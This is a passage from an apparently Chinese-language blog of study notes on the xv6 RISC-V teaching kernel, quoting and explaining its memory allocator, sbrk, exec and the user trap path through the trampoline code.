class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kinit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">initlock(&amp;kmem.lock, <span class="string">&quot;kmem&quot;</span>);</span><br><span class="line">freerange(end, (<span class="keyword">void</span> *)PHYSTOP);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freerange</span><span class="params">(<span class="keyword">void</span> *pa_start, <span class="keyword">void</span> *pa_end)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *p;</span><br><span class="line">p = (<span class="keyword">char</span> *)PGROUNDUP((uint64)pa_start);</span><br><span class="line"><span class="keyword">for</span> (; p + PGSIZE &lt;= (<span class="keyword">char</span> *)pa_end; p += PGSIZE)</span><br><span class="line">kfree(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Free the page of physical memory pointed at by v,</span></span><br><span class="line"><span class="comment">// which normally should have been returned by a</span></span><br><span class="line"><span class="comment">// call to kalloc().  (The exception is when</span></span><br><span class="line"><span class="comment">// initializing the allocator; see kinit above.)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kfree</span><span class="params">(<span class="keyword">void</span> *pa)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (((uint64)pa % PGSIZE) != <span class="number">0</span> || (<span class="keyword">char</span> *)pa &lt; end || (uint64)pa &gt;= PHYSTOP)</span><br><span class="line">panic(<span class="string">&quot;kfree&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Fill with junk to catch dangling refs.</span></span><br><span class="line"><span class="built_in">memset</span>(pa, <span class="number">1</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line">r = (struct run *)pa;</span><br><span class="line"></span><br><span class="line">acquire(&amp;kmem.lock);</span><br><span class="line">r-&gt;next = kmem.freelist;</span><br><span class="line">kmem.freelist = r;</span><br><span class="line">release(&amp;kmem.lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-5-进程地址空间"><a href="#3-5-进程地址空间" class="headerlink" title="3.5 进程地址空间"></a>3.5 进程地址空间</h2><p>每个进程都有一个单独的页表，当xv6在进程之间切换时，也会更改页表。一个进程的用户内存从虚拟地址零开始，可以增长到MAXVA，原则上允许一个进程内存寻址空间为256G。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// one beyond the highest possible virtual address.</span></span><br><span class="line"><span class="comment">// MAXVA is actually one bit less than the max allowed by</span></span><br><span class="line"><span class="comment">// Sv39, to avoid having to sign-extend virtual addresses</span></span><br><span class="line"><span class="comment">// that have the high bit set.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXVA (1L &lt;&lt; (9 + 9 + 9 + 12 - 1))</span></span><br></pre></td></tr></table></figure><p><img src="/2022/07/12/XV6/image-20220713121236349.png"></p><p>当进程向xv6请求更多的用户内存时，首先使用<code>kalloc</code>来分配物理页面。</p><p>内核在用户地址空间的顶部映射一个带有蹦床（trampoline）代码的页面，这样在所有地址空间都可以看到一个单独的物理内存页面。</p><p>为了检测用户栈是否溢出了所分配栈内存，xv6在栈正下方放置了一个无效的保护页（guard page）。如果用户栈溢出并且进程试图使用栈下方的地址，那么由于映射无效（<code>PTE_V</code>为0）硬件将生成一个页面故障异常。</p><h2 id="3-6-sbrk"><a href="#3-6-sbrk" class="headerlink" title="3.6 sbrk"></a>3.6 sbrk</h2><p><code>sbrk</code>是一个用于进程减少或增长其内存的系统调用。其实是调用<code>growproc</code>实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint64</span></span><br><span class="line"><span class="function"><span class="title">sys_sbrk</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> addr;</span><br><span class="line">  <span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(argint(<span class="number">0</span>, &amp;n) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  addr = myproc()-&gt;sz;</span><br><span class="line">  <span class="keyword">if</span>(growproc(n) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>growproc</code>根据<code>n</code>是正的还是负的调用<code>uvmalloc</code>或<code>uvmdealloc</code>。<code>uvmalloc</code>用<code>kalloc</code>分配物理内存，并用<code>mappages</code>将PTE添加到用户页表中；<code>uvmdealloc</code>调用<code>uvmunmap</code>，<code>uvmunmap</code>使用<code>walk</code>来查找对应的PTE，并使用<code>kfree</code>来释放PTE引用的物理内存。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Grow or shrink user memory by n bytes.</span></span><br><span class="line"><span class="comment">// Return 0 on success, -1 on failure.</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">growproc</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">uint sz;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">sz = p-&gt;sz;</span><br><span class="line"><span class="keyword">if</span> (n &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ((sz = uvmalloc(p-&gt;pagetable, sz, sz + n)) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">sz = uvmdealloc(p-&gt;pagetable, sz, sz + n);</span><br><span class="line">&#125;</span><br><span class="line">p-&gt;sz = sz;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-7-exec"><a href="#3-7-exec" class="headerlink" title="3.7 exec"></a>3.7 exec</h2><p>代码在<code>kernel/exec.c</code>中 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">exec</span><span class="params">(<span class="keyword">char</span> *path, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *s, *last;</span><br><span class="line"><span class="keyword">int</span> i, off;</span><br><span class="line">uint64 argc, sz = <span class="number">0</span>, sp, ustack[MAXARG + <span class="number">1</span>], stackbase;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">elfhdr</span> <span class="title">elf</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">ip</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proghdr</span> <span class="title">ph</span>;</span></span><br><span class="line"><span class="keyword">pagetable_t</span> pagetable = <span class="number">0</span>, oldpagetable;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">begin_op();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((ip = namei(path)) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">end_op();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">ilock(ip);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check ELF header</span></span><br><span class="line"><span class="keyword">if</span> (readi(ip, <span class="number">0</span>, (uint64)&amp;elf, <span class="number">0</span>, <span class="keyword">sizeof</span>(elf)) != <span class="keyword">sizeof</span>(elf))</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line"><span class="keyword">if</span> (elf.magic != ELF_MAGIC)</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((pagetable = proc_pagetable(p)) == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Load program into memory.</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>, off = elf.phoff; i &lt; elf.phnum; i++, off += <span class="keyword">sizeof</span>(ph))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (readi(ip, <span class="number">0</span>, (uint64)&amp;ph, off, <span class="keyword">sizeof</span>(ph)) != <span class="keyword">sizeof</span>(ph))</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line"><span class="keyword">if</span> (ph.type != ELF_PROG_LOAD)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (ph.memsz &lt; ph.filesz)</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line"><span class="keyword">if</span> (ph.vaddr + ph.memsz &lt; ph.vaddr)</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line">uint64 sz1;</span><br><span class="line"><span class="keyword">if</span> ((sz1 = uvmalloc(pagetable, sz, ph.vaddr + ph.memsz)) == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line">sz = sz1;</span><br><span class="line"><span class="keyword">if</span> (ph.vaddr % PGSIZE != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line"><span class="keyword">if</span> (loadseg(pagetable, ph.vaddr, ip, ph.off, ph.filesz) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line">&#125;</span><br><span class="line">iunlockput(ip);</span><br><span class="line">end_op();</span><br><span class="line">ip = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">p = myproc();</span><br><span class="line">uint64 oldsz = p-&gt;sz;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate two pages at the next page boundary.</span></span><br><span class="line"><span class="comment">// Use the second as the user stack.</span></span><br><span class="line">sz = PGROUNDUP(sz);</span><br><span class="line">uint64 sz1;</span><br><span class="line"><span class="keyword">if</span> ((sz1 = uvmalloc(pagetable, sz, sz + <span class="number">2</span> * PGSIZE)) == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line">sz = sz1;</span><br><span class="line">uvmclear(pagetable, sz - <span class="number">2</span> * PGSIZE);</span><br><span class="line">sp = sz;</span><br><span class="line">stackbase = sp - PGSIZE;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Push argument strings, prepare rest of stack in ustack.</span></span><br><span class="line"><span class="keyword">for</span> (argc = <span class="number">0</span>; argv[argc]; argc++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (argc &gt;= MAXARG)</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line">sp -= <span class="built_in">strlen</span>(argv[argc]) + <span class="number">1</span>;</span><br><span class="line">sp -= sp % <span class="number">16</span>; <span class="comment">// riscv sp must be 16-byte aligned</span></span><br><span class="line"><span class="keyword">if</span> (sp &lt; stackbase)</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line"><span class="keyword">if</span> (copyout(pagetable, sp, argv[argc], <span class="built_in">strlen</span>(argv[argc]) + <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line">ustack[argc] = sp;</span><br><span class="line">&#125;</span><br><span class="line">ustack[argc] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// push the array of argv[] pointers.</span></span><br><span class="line">sp -= (argc + <span class="number">1</span>) * <span class="keyword">sizeof</span>(uint64);</span><br><span class="line">sp -= sp % <span class="number">16</span>;</span><br><span class="line"><span class="keyword">if</span> (sp &lt; stackbase)</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line"><span class="keyword">if</span> (copyout(pagetable, sp, (<span class="keyword">char</span> *)ustack, (argc + <span class="number">1</span>) * <span class="keyword">sizeof</span>(uint64)) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> bad;</span><br><span class="line"></span><br><span class="line"><span class="comment">// arguments to user main(argc, argv)</span></span><br><span class="line"><span class="comment">// argc is returned via the system call return</span></span><br><span class="line"><span class="comment">// value, which goes in a0.</span></span><br><span class="line">p-&gt;trapframe-&gt;a1 = sp;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Save program name for debugging.</span></span><br><span class="line"><span class="keyword">for</span> (last = s = path; *s; s++)</span><br><span class="line"><span class="keyword">if</span> (*s == <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">last = s + <span class="number">1</span>;</span><br><span class="line">safestrcpy(p-&gt;name, last, <span class="keyword">sizeof</span>(p-&gt;name));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Commit to the user image.</span></span><br><span class="line">oldpagetable = p-&gt;pagetable;</span><br><span class="line">p-&gt;pagetable = pagetable;</span><br><span class="line">p-&gt;sz = sz;</span><br><span class="line">p-&gt;trapframe-&gt;epc = elf.entry; <span class="comment">// initial program counter = main</span></span><br><span class="line">p-&gt;trapframe-&gt;sp = sp;   <span class="comment">// initial stack pointer</span></span><br><span class="line">proc_freepagetable(oldpagetable, oldsz);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> argc; <span class="comment">// this ends up in a0, the first argument to main(argc, argv)</span></span><br><span class="line"></span><br><span class="line">bad:</span><br><span class="line"><span class="keyword">if</span> (pagetable)</span><br><span class="line">proc_freepagetable(pagetable, sz);</span><br><span class="line"><span class="keyword">if</span> (ip)</span><br><span class="line">&#123;</span><br><span class="line">iunlockput(ip);</span><br><span class="line">end_op();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先使用<code>namei</code>打开指定二进制path，之后读ELF的文件头，检查magic。</p><p>之后使用<code>proc_pagetable</code>分配一个没有用户映射的新页表，使用<code>uvmalloc</code> 为每个ELF段分配内存，并使用<code>loadseg</code> 将每个段加载到内存中。<code>loadseg</code>使用<code>walkaddr</code>找到分配内存的物理地址，在该地址写入ELF段的每一页，并使用<code>readi</code>从文件中读取。</p><p>现在<code>exec</code>分配并初始化用户栈。它只分配一个栈页面。<code>exec</code>一次将参数中的一个字符串复制到栈顶，并在<code>ustack</code>中记录指向它们的指针。它在传递给<code>main</code>的<code>argv</code>列表的末尾放置一个空指针。<code>ustack</code>中的前三个条目是伪返回程序计数器（fake return program counter）、<code>argc</code>和<code>argv</code>指针。</p><p><code>exec</code>在栈页面的正下方放置了一个不可访问的页面，这样试图使用超过一个页面的程序就会出错。</p><p>在准备新内存映像的过程中，如果<code>exec</code>检测到像无效程序段这样的错误，它会跳到标签<code>bad</code>，释放新映像，并返回-1。<code>exec</code>必须等待系统调用会成功后再释放旧映像：因为如果旧映像消失了，系统调用将无法返回-1。<code>exec</code>中唯一的错误情况发生在映像的创建过程中。一旦映像完成，<code>exec</code>就可以提交到新的页表(上述代码104行)并释放旧的页表(上述代码108行)。</p><h2 id="3-8-Real-world"><a href="#3-8-Real-world" class="headerlink" title="3.8 Real world"></a>3.8 Real world</h2><p>RISC-V支持物理地址级别的保护，但xv6没有使用这个特性。</p><p>xv6内核缺少一个类似<code>malloc</code>可以为小对象提供内存的分配器，这使得内核无法使用需要动态分配的复杂数据结构。</p><h1 id="Chapter-4-Traps-and-system-calls"><a href="#Chapter-4-Traps-and-system-calls" class="headerlink" title="Chapter 4:Traps and system calls"></a>Chapter 4:Traps and system calls</h1><p>有三种事件会导致中央处理器搁置普通指令的执行，并强制将控制权转移到处理该事件的特殊代码上：陷阱（trap）</p><ol><li>系统调用：当用户程序执行<code>ecall</code>指令要求内核为其做些什么时</li><li>异常：（用户或内核）指令做了一些非法的事情，例如除以零或使用无效的虚拟地址</li><li>设备中断：例如当磁盘硬件完成读或写请求时，向系统表明它需要被关注</li></ol><p>通常，陷阱发生时正在执行的任何代码都需要稍后恢复。</p><p>通常的顺序是陷阱强制将控制权转移到内核；内核保存寄存器和其他状态，以便可以恢复执行；内核执行适当的处理程序代码（例如，系统调用接口或设备驱动程序）；内核恢复保存的状态并从陷阱中返回；原始代码从它停止的地方恢复。</p><h2 id="4-1-RISC-V陷入机制"><a href="#4-1-RISC-V陷入机制" class="headerlink" title="4.1 RISC-V陷入机制"></a>4.1 RISC-V陷入机制</h2><p>每个RISC-V CPU都有一组控制寄存器，内核通过向这些寄存器写入内容来告诉CPU如何处理陷阱，内核可以读取这些寄存器来明确已经发生的陷阱。</p><p>一些重要的寄存器介绍：</p><ul><li><code>stvec</code>：内核在这里写入其陷阱处理程序的地址；RISC-V跳转到这里处理陷阱。</li><li><code>sepc</code>：当发生陷阱时，RISC-V会在这里保存程序计数器<code>pc</code>（因为<code>pc</code>会被<code>stvec</code>覆盖）。<code>sret</code>（从陷阱返回）指令会将<code>sepc</code>复制到<code>pc</code>。内核可以写入<code>sepc</code>来控制<code>sret</code>的去向。</li><li><code>scause</code>： RISC-V在这里放置一个描述陷阱原因的数字。</li><li><code>sscratch</code>：内核在这里放置了一个值，这个值在陷阱处理程序一开始就会派上用场。</li><li><code>sstatus</code>：其中的<strong>SIE</strong>位控制设备中断是否启用。如果内核清空<strong>SIE</strong>，RISC-V将推迟设备中断，直到内核重新设置<strong>SIE</strong>。<strong>SPP</strong>位指示陷阱是来自用户模式还是管理模式，并控制<code>sret</code>返回的模式。</li></ul><p>上述寄存器在用户模式下不能读取和写入。</p><p>当需要强制执行陷阱时，RISC-V硬件对所有陷阱类型（计时器中断除外）执行以下操作：</p><ol><li>如果陷阱是设备中断，并且状态<strong>SIE</strong>位被清空，则不执行以下任何操作。</li><li>清除<strong>SIE</strong>以禁用中断。</li><li>将<code>pc</code>复制到<code>sepc</code>。</li><li>将当前模式（用户或管理）保存在状态的<strong>SPP</strong>位中。</li><li>设置<code>scause</code>以反映产生陷阱的原因。</li><li>将模式设置为管理模式。</li><li>将<code>stvec</code>复制到<code>pc</code>。</li><li>在新的<code>pc</code>上开始执行。</li></ol><blockquote><p>   <strong>CPU不会切换到内核页表，不会切换到内核栈，也不会保存除<code>pc</code>之外的任何寄存器。</strong></p></blockquote><h2 id="4-2-从用户空间陷入"><a href="#4-2-从用户空间陷入" class="headerlink" title="4.2 从用户空间陷入"></a>4.2 从用户空间陷入</h2><blockquote><p>  来自用户空间的陷阱的高级路径是<code>uservec</code> (<strong>kernel&#x2F;trampoline.S</strong>)，然后是<code>usertrap</code> (<strong>kernel&#x2F;trap.c</strong>)；返回时，先是<code>usertrapret</code> (<strong>kernel&#x2F;trap.c</strong>)，然后是<code>userret</code> (<strong>kernel&#x2F;trampoline.S</strong>)。</p><p>  由于RISC-V硬件在陷阱期间不会切换页表，所以用户页表必须包括<code>uservec</code>（<strong>stvec</strong>指向的陷阱向量指令）的映射。<code>uservec</code>必须切换<code>satp</code>以指向内核页表；为了在切换后继续执行指令，<code>uservec</code>必须在内核页表中与用户页表中映射相同的地址。</p><p>  xv6使用包含<code>uservec</code>的蹦床页面（trampoline page）来满足这些约束。xv6将蹦床页面映射到内核页表和每个用户页表中相同的虚拟地址。这个虚拟地址是<code>TRAMPOLINE</code>。蹦床内容在<strong>trampoline.S</strong>中设置，并且（当执行用户代码时）<code>stvec</code>设置为<code>uservec</code> 。</p></blockquote><blockquote><p>  <a href="http://xv6.dgs.zone/tranlate_books/book-riscv-rev1/c4/s2.html">http://xv6.dgs.zone/tranlate_books/book-riscv-rev1/c4/s2.html</a></p></blockquote><p>陷入：</p><p><code>uservec</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">.globl uservec</span><br><span class="line">uservec:    </span><br><span class="line">        <span class="meta"># trap.c sets stvec to point here, so</span></span><br><span class="line">        <span class="meta"># traps from user space start here,</span></span><br><span class="line">        <span class="meta"># in supervisor mode, but with a</span></span><br><span class="line">        <span class="meta"># user page table.</span></span><br><span class="line">        #</span><br><span class="line">        <span class="meta"># sscratch points to where the process<span class="meta-string">&#x27;s p-&gt;trapframe is</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        # mapped into user space, at TRAPFRAME.</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        #</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        </span></span></span><br><span class="line"><span class="meta-string"><span class="meta"># swap a0 and sscratch</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        # so that a0 is TRAPFRAME</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        csrrw a0, sscratch, a0</span></span></span><br><span class="line"><span class="meta-string"><span class="meta"></span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        # save the user registers in TRAPFRAME</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd ra, 40(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd sp, 48(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd gp, 56(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd tp, 64(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd t0, 72(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd t1, 80(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd t2, 88(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd s0, 96(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd s1, 104(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd a1, 120(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd a2, 128(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd a3, 136(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd a4, 144(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd a5, 152(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd a6, 160(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd a7, 168(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd s2, 176(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd s3, 184(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd s4, 192(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd s5, 200(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd s6, 208(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd s7, 216(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd s8, 224(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd s9, 232(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd s10, 240(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd s11, 248(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd t3, 256(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd t4, 264(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd t5, 272(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd t6, 280(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta"></span></span></span><br><span class="line"><span class="meta-string"><span class="meta"># save the user a0 in 